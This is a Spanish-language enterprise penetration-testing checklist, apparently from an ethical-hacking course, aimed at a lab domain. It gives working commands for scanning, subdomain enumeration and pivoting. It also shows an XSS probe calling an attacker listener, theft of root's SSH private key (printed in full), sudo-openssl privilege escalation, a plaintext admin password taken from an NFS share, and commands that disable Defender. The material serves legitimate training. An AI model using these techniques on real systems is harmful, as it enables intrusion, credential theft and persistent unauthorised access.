
# Enterprise Hacking Checklist

## <mark style="color:purple;">Scope</mark>

<table data-header-hidden><thead><tr><th width="401.078125"></th><th></th></tr></thead><tbody><tr><td><strong>Pruebas externas</strong></td><td><strong>Pruebas internas</strong></td></tr><tr><td><code>10.129.10.10</code> - Host externo</td><td><code>172.16.8.0/23</code> - Subred interna 1</td></tr><tr><td><code>10.129.10.0/24</code> - Red externa</td><td><code>172.16.9.0/23</code> - Subred interna 2</td></tr><tr><td><code>*.inlanefreight.local</code> - Todos los subdominios</td><td>INLANEFREIGHT.LOCAL (dominio de Active Directory)</td></tr></tbody></table>

## <mark style="color:purple;">Enumeración externa</mark>

### etc/hosts

```bash
sudo gedit /etc/hosts

10.129.10.10    inlanefreight.local
```

### Escaneo simple

```bash
sudo nmap -v --open -oA inlanefreight_scan -iL scope
```

<table><thead><tr><th width="252.78515625">Opción</th><th>Descripción</th></tr></thead><tbody><tr><td><code>sudo</code></td><td>Nmap requiere privilegios para ciertos tipos de escaneo (como SYN scan).</td></tr><tr><td><code>--open</code></td><td><strong>Filtra solo hosts con puertos abiertos</strong>, omitiendo los que no responden.</td></tr><tr><td><code>-oA inlanefreight_tcp_1k</code></td><td>Guarda los resultados en <strong>3 formatos (normal, XML y grepable)</strong> con prefijo <code>inlanefreight_scan</code>.</td></tr><tr><td><code>-iL scope</code></td><td>Lee la lista de objetivos desde un archivo llamado <code>scope</code>. Cada línea del archivo contiene una IP o rango.</td></tr></tbody></table>

### Escaneo completo

```bash
sudo nmap -v --open -p- -A -oA inlanefreight_svc -iL scope
```

### Extraer servicios en ejecución

```bash
egrep -v "^#|Status: Up" inlanefreight_svc.gnmap | cut -d ' ' -f4- | tr ',' '\n' | \                                                               
sed -e 's/^[ \t]*//' | awk -F '/' '{print $7}' | grep -v "^$" | sort | uniq -c \
| sort -k 1 -nr

      2 Dovecot pop3d
      2 Dovecot imapd (Ubuntu)
      2 Apache httpd 2.4.41 ((Ubuntu))
      1 vsftpd 3.0.3
      1 Postfix smtpd
      1 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
      1 2-4 (RPC #100000)
```

### Escaneo SYN de red externa

```bash
sudo nmap -v -sS -T5 -Pn 10.129.10.0/24
```

### Escaneo de servicios de red externa

```bash
sudo nmap -v -sV -Pn 10.129.10.0/24
```

### Enumeración de subdominios

#### Con DIG

```bash
dig axfr inlanefreight.local @10.129.10.10
```

#### Con dnsenum

```bash
dnsenum --enum inlanefreight.local -f  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
```

#### Con subfinder

```
subfinder -d inlanefreight.local
```

#### Con subbrute (sin conexión)

```shell-session
afsh4ck@kali$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
afsh4ck@kali$ cd subbrute
afsh4ck@kali$ echo "ns1.inlanefreight.local" > resolvers.txt
afsh4ck@kali$ subbrute inlanefreight.local -s names.txt -r resolvers.txt
```

### Enumeración de Vhosts

Primero debemos detectar el `Content-Length` enviando una petición a un vhost que no existe:

```bash
curl -s -I http://10.129.10.10 -H "HOST: defnotvalid.inlanefreight.local" | grep "Content-Length:"

Content-Length: 15157
```

Después enumeramos los vhosts con ffuf filtrando por el Content-Length con `-fs`:

{% hint style="success" %}
Esto posiblemente encuentre otros subdominios que no encuentren otras técnicas como transferencia de zona, subfinder, etc...
{% endhint %}

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://10.129.10.10/ -H 'Host:FUZZ.inlanefreight.local' -fs 15157
```

También podemos crear un archivo con multitud de IPs y usar un bucle for con ffuf para enumerar vhosts en múltiples IPs:

{% code title="valid-ips.txt" %}

```
10.129.10.10
10.129.10.20
10.129.10.30
```

{% endcode %}

```bash
for ip in $(cat valid-ips.txt); do
  ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ \
       -u http://$ip/ \
       -H "Host:FUZZ.inlanefreight.local" \
       -fs 15157 \
       -of md -o ffuf_$ip.md
done
```

### EyeWitness para vision global

{% embed url="<https://github.com/RedSiege/EyeWitness>" %}

```bash
git clone https://github.com/FortyNorthSecurity/EyeWitness.git
cd EyeWitness
sudo ./setup/setup.sh
```

```bash
eyewitness -f subdomains.txt -d ILFREIGHT_subdomain_EyeWitness
```

<table><thead><tr><th width="322.12109375">Parte</th><th>Significado</th></tr></thead><tbody><tr><td><code>-f ilfreight_subdomains</code></td><td>Le indica que lea un <strong>archivo con URLs o IPs objetivo</strong> línea por línea.</td></tr><tr><td><code>-d ILFREIGHT_subdomain_EyeWitness</code></td><td>Define el nombre de la <strong>carpeta de salida</strong> donde se almacenarán los resultados.</td></tr></tbody></table>

***

## <mark style="color:purple;">Enumeración y explotación web</mark>

Acceder a cada host encontrado y ver posibles formas de explotación:

* Búsqueda de versiones y exploits públicos
* Ver funcionalidades explotables
* Analizar envío de formularios con Burp Suite

{% content-ref url="/pages/g0QQYflMiffDVxjHrLDE" %}
[Enumeración y explotación web](/ethical-hacking-cheatsheet/hacking-en-entornos-reales/enterprise-hacking/pruebas-externas/enumeracion-y-explotacion-web.md)
{% endcontent-ref %}

### Prueba de XSS

Probaremos el siguiente script en los campos del formulario para ver si es vulnerable a Cross Site Scipting (XSS):

```javascript
 "><script src=http://10.10.14.15:9000/TESTING_THIS</script>
```

Cambiamos la IP por la nuestra y iniciamos un listener con `Netcat` en el puerto 9000. Hacemos clic en el botón `Send` y comprobamos si el listener recibe una llamada para confirmar la vulnerabilidad.

```shell-session
afsh4ck@kali$ nc -lvnp 9000
```

***

## <mark style="color:purple;">Persistencia Post Explotación</mark>

Una vez que hemos conseguido acceso a un objetivo, por ejemplo por SSH nuestro objetivo es crear persistencia para acceder en cualquier momento. Para ello:

1. Accedemos por SSH al objetivo
2. Elevamos privilegios a root en el host (para acceder siempre como root)
3. En el directorio `/root` accedemos a `.ssh` y copiamos el `id_rsa` en nuestro equipo atacante

```shell-session
afsh4ck@kali$ ssh srvadm@10.129.10.10

srvadm@dmz01:~$ cd /root/.ssh/
srvadm@dmz01:~$ cat id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
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
WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----
```

#### Si el objetivo tiene permisos openssl (bastante común)

{% embed url="<https://gtfobins.github.io/gtfobins/openssl/>" %}

```shell-session
srvadm@dmz01:~$ sudo -l

Matching Defaults entries for srvadm on dmz01:
  env_reset, mail_badpass,
  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User srvadm may run the following commands on dmz01:
  (ALL) NOPASSWD: /usr/bin/openssl
```

```shell-session
srvadm@dmz01:~$ LFILE=/root/.ssh/id_rsa
srvadm@dmz01:~$ sudo /usr/bin/openssl enc -in $LFILE

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA0ksXgILHRb0j1s3pZH8s/EFYewSeboEi4GkRogdR53GWXep7GJMI
oxuXTaYkMSFG9Clij1X6crkcWLnSLuKI8KS5qXsuNWISt+T1bpvTfmFymDIWNx4efR/Yoa
vpXx+yT/M2X9boHpZHluuR9YiGDMZlr3b4hARkbQAc0l66UD+NB9BjH3q/kL84rRASMZ88
y2jUwmR75Uw/wmZxeVD5E+yJGuWd+ElpoWtDW6zenZf6bqSS2VwLhbrs3zyJAXG1eGsGe6
<---SNIP--->
```

#### Si no hay id\_rsa en el objetivo

Crear par de claves SSH en el host remoto con `ssh-keygen`:

```shell-session
srvadm@dmz01:~$ sudo su
root@dmz01:~# ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
```

Este comando:

* Crea un par de claves (`id_rsa` y `id_rsa.pub`)
* **Sin passphrase** (`-N ""`)
* En `/root/.ssh/` (usa `-f` para la ruta)

✅ Ahora tienes un `id_rsa` privado que puedes copiar a tu Kali para tener acceso persistente como root sin especificar una contraseña.

***

## <mark style="color:purple;">Acceso a redes internas</mark>

### Localizar redes internas

Una vez que hemos accedido a un host podemos usar `ifconfig` en linux o `ipconfig` en windows para ver las redes disponibles. Las redes internas siempre suelen tener el formato `172.16.8.x` o similar:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>root@dmz01:~# ifconfig -a
</strong>
eth0: flags=4163&#x3C;UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.8.120  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:acff:fe11:2  prefixlen 64  scopeid 0x20&#x3C;link>
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
</code></pre>

### Configurar Pivoting SSH

#### 1. Habilitar Port Forwarding SSH con `-D 8081`

```bash
ssh -D 8081 -i dmz01_key root@10.129.10.10
```

#### 2. Añadir proxy Socks4 a `proxychains4.conf`

```bash
afsh4ck@kali$ sudo gedit /etc/proxychains4.conf 

#	socks4	192.168.1.49	1080
#       proxy types: http, socks4, socks5
socks4 	127.0.0.1 8081
```

#### 3. Utilizar proxychains para hacer pivoting a red interna, p.e. `172.16.8.120`

```bash
proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
```

### Configurar Pivoting RDP

#### 1. Habilitar port forwarding con `-L 13389` apuntando al host interno `172.16.8.20` que tiene RDP habilitado

```bash
ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.10.10
```

#### 2. Conexión con xfreerdp a `127.0.0.1:13389` que redirige a `172.16.8.20:3389`

```bash
xfreerdp /v:127.0.0.1:13389 /u:user /p:password /drive:home,"/home/kali/Escritorio/hack-tools/WINDOWS"
```

***

## <mark style="color:purple;">Enumeración interna</mark>

### Descubrimiento de hosts internos

#### Ping Sweep con Metasploit

{% hint style="info" %}
Debemos tener una sesión de Meterpreter abierta y llevarla al background
{% endhint %}

* Ahora configuramos `autoroute` con Metasploit, indicándole la `session` y la subnet a la que queremos acceder, p.e. `172.16.8.0`:

```bash
(Meterpreter 1)(/tmp) > background
[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/manage/autoroute 

[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set SESSION 1
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set subnet 172.16.8.0
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.203.111
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
```

* Una vez configurado el autoroute llevamos la session al background de nuevo y usamos el módulo de ping\_sweep contra la subred interna:

```bash
(Meterpreter 1)(/tmp) > background
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> use post/multi/gather/ping_sweep
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> show options 

Module options (post/multi/gather/ping_sweep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       IP Range to perform ping sweep against.
   SESSION                   yes       The session to run this module on

[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set rhosts 172.16.8.0/23
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set SESSION 1
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> run

[*] Performing ping sweep for IP range 172.16.8.0/23
[+] 	172.16.8.3 host found
[+] 	172.16.8.20 host found
[+] 	172.16.8.50 host found
[+] 	172.16.8.120 host found
```

#### Ping Sweep con bucle for

Cuando hemos accedido por SSH a un host o tenemos una reverse shell en el objetivo podemos ejecutar la siguiente línea para buscar hosts internos en la subred que le indiquemos, en este caso `172.16.8.x`

```shell-session
root@dmz01:~# for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from

64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=0.472 ms
64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=0.433 ms
64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=0.642 ms
```

#### Ping Sweep con Powershell

Si estamos dentro de un host Windows podemos hacer un ping sweep con Powershell. Esta técnica nos mostrará un True en los host activos dentro de la subred que le indiquemos, en este caso la segunda subred `172.16.9.x`

```powershell
*Evil-WinRM* PS C:\>  1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
172.16.9.1: False
172.16.9.2: False
172.16.9.3: True
172.16.9.4: False

<SNIP>

172.16.9.24: False
172.16.9.25: True
172.16.9.26: False
172.16.9.27: False

<SNIP>
```

### Guardar resultados

Estos hosts los guardamos en un archivo `live_hosts`:

<pre class="language-bash"><code class="lang-bash"><strong>echo -e '172.16.8.3\n172.16.8.20\n172.16.8.50' > live_hosts
</strong></code></pre>

### Enumeración de hosts con Nmap

Vamos a enviar a la máquina un binario de Nmap para ejecutarlo desde la red interna:

{% embed url="<https://github.com/andrew-d/static-binaries>" %}

```shell-session
afsh4ck@kali$ wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap

afsh4ck@kali$ python3 -m http.server 80     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell-session
root@dmz01:~# wget http://10.10.15.248/nmap

root@dmz01:~# chmod +x nmap

root@dmz01:~# ls
flag.txt  nmap

root@dmz01:~# echo -e '172.16.8.3\n172.16.8.20\n172.16.8.50' > live_hosts

root@dmz01:~# ./nmap -v --open -iL live_hosts
```

```bash
Nmap scan report for 172.16.8.3
PORT    STATE SERVICE
53/tcp  open  domain
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps
MAC Address: 00:50:56:94:99:09 (Unknown)

Nmap scan report for 172.16.8.20
Host is up (0.00060s latency).
Not shown: 1175 closed ports
PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  sunrpc
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:94:D9:E6 (Unknown)

Nmap scan report for 172.16.8.50
Host is up (0.00072s latency).
Not shown: 1177 closed ports
PORT     STATE SERVICE
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-alt
MAC Address: 00:50:56:94:7D:23 (Unknown)
```

### Enumerar Controlador de Dominio

Si encontramos un DC, como en este caso el `172.16.8.3` podemos enumerarlo con `enum4linux-ng` para intentar obtener usuarios o información del dominio:

```bash
sudo apt install enum4linux-ng
```

{% hint style="info" %}
Si es un host interno debemos configurar el [pivoting SSH](#configurar-pivoting-ssh)
{% endhint %}

<pre class="language-bash"><code class="lang-bash"><strong>proxychains enum4linux-ng -U -P 172.16.8.3
</strong>
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
ENUM4LINUX - next generation (v1.3.4)

 ===================================
|    Listener Scan on 172.16.8.3    |
 ===================================
[*] Checking SMB
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:139  ...  OK
[+] SMB over NetBIOS is accessible on 139/tcp

 =========================================================
|    Domain Information via SMB session for 172.16.8.3    |
 =========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
[+] Found domain information via SMB
NetBIOS computer name: DC01
NetBIOS domain name: INLANEFREIGHT
DNS domain: INLANEFREIGHT.LOCAL
FQDN: DC01.INLANEFREIGHT.LOCAL
Derived membership: domain member
Derived domain: INLANEFREIGHT

 =======================================
|    RPC Session Check on 172.16.8.3    |
 =======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 ===================================
|    Users via RPC on 172.16.8.3    |
 ===================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

&#x3C;---SNIP--->
</code></pre>

### Acceso a webs internas

Si hay algún servicio web expuesto en la red interna, como en este caso la `172.16.8.20:80`  podemos acceder configurando el proxy en el navegador de la siguiente manera:

{% hint style="info" %}
Debemos configurar el [pivoting SSH](#configurar-pivoting-ssh) para acceder correctamente
{% endhint %}

<figure><img src="/files/LELKIN10k9vmVEHoihDr" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/6cEfaXQFf5zalo2xel5Y" alt=""><figcaption></figcaption></figure>

### Listar y montar NFS (si está expuesto)

```bash
Nmap scan report for 172.16.8.20
Host is up (0.00060s latency).
Not shown: 1175 closed ports
PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  sunrpc
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs  # <-------------------- # NFS expuesto
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:94:D9:E6 (Unknown)
```

```bash
proxychains showmount -e 172.16.8.20

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:111  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:2049  ...  OK
Export list for 172.16.8.20:
/DEV01 (everyone)
```

Encontramos DEV01.

#### Montar NFS

No podemos montar el recurso compartido NFS mediante Proxychains, pero  tenemos acceso root al host `dmz01` para ello. En este caso el directorio `DNN` contiene un archivo `web.config` que contiene credenciales para acceder al host que hemos encontrado: `172.16.8.20:80`

```shell-session
root@dmz01:~# cd /tmp
root@dmz01:/tmp# mkdir DEV01
root@dmz01:/tmp# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
root@dmz01:/tmp# cd DEV01/
root@dmz01:/tmp/DEV01# ls
BuildPackages.bat            CKToolbarButtons.xml  DNN       WatchersNET.CKEditor.sln
CKEditorDefaultSettings.xml  CKToolbarSets.xml     flag.txt
```

```shell-session
root@dmz01:/tmp/DEV01/DNN# cat web.config
<?xml version="1.0"?>
<configuration>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.6.2" />
      </system.Web>
  -->
  <username>Administrator</username>
  <password>
	<value>D0tn31Nuk3R0ck$$@123</value>
```

### Enumeración con Powershell

```powershell
# Enumera todos los usuarios del dominio
Get-ADUser -Filter * | Select Name
 
# Mapeo la red
Get-NetNeighbor | Where-Object {$_.State -eq "Reachable”}

# Ver administradores
net localgroup administrators

# Ver recursos compartidos de otro equipo
net view \\IP_del_equipo

# Muestra tu identidad, tokens y privilegios
whoami /all

# Ver archivos en los escritorios accesibles
dir \\equipo\C$\Users\*\Desktop

# Busca contraseñas en archivos
findstr /si password *.txt *.xml *.config

# Busca procesos sospechosos
Get-Process | Sort CPU -Descending

# Extrae el DNS cache
ipconfig /displaydns

# Desactiva el Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Descativa la política de ejecución de scripts
Set-ExecutionPolicy Bypass -Scope Process -Force
```
